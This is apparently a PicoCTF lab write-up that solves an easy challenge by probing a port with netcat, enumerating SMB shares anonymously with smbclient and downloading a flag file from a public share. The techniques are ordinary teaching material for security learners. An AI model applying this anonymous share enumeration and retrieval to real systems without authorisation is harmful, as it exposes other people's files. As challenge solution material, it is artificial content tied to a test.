# 🖨️ Printer Shares

**Platform:** PicoCTF 

**Category:** General Skills

**Difficulty:** 🟢 Easy

## Challenge Description
An important file was accidentally sent to a network printer. The goal is to connect to the SMB service, browse the shared files, and retrieve the flag.

## Solution

First, verify that the target port is open:
```bash
nc -vz mysterious-sea.picoctf.net 56762
```

The connection succeeds, indicating the SMB service is available.

Next, enumerate the available SMB shares:
```bash
smbclient -L //mysterious-sea.picoctf.net -p 56762 -N
```

The output reveals a public share named `shares`.

Connect to the share anonymously:
```bash
smbclient //mysterious-sea.picoctf.net/shares -p 56762 -N
```

List the files:
```bash
ls
```
```text
dummy.txt
flag.txt
```

Download the flag:
```bash
get flag.txt
exit
```

Finally, display the flag:
```bash
cat flag.txt
```

## Skills Learned
- SMB Enumeration
- smbclient
- Anonymous SMB Access
- File Retrieval
- Linux Networking

## Tools
- Netcat
- smbclient
- Linux Terminal

## Flag
```text
picoCTF{hidden}
```
